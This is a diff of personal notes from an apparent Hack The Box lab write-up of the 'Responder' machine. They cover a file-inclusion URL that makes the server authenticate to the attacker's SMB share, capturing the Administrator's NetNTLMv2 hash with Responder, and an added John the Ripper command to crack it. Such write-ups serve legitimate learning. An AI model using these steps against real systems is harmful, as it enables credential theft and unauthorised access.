@@ -32,7 +32,11 @@ Now we tell the server to include a resource from our SMB Server by setting the 
 http://unika.htb/?page=//@IP/somefile
 ```
 
-The server will try to finde the file but it doesn't exists. Mean while, we captured the NetNTLMv for the Administrator User.
+The server will try to finde the file but it doesn't exists. Mean while, we captured the NetNTLMv for the Administrator User. Now with `john` we can dump the hash.
+```bash
+$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+[hash.txt]: Is the hash captured with Responder and redirected to a file.
 
 # WinRM
 Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. 
@@ -94,7 +98,7 @@ More info about NTLM. [Link](https://www.ionos.com/digitalguide/server/know-how/
 When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge response, and if we find one, we know that is the password.
 
 
-# John The Ripper
+
 
 
 Instal·lar responder = caturar hash del NTLM
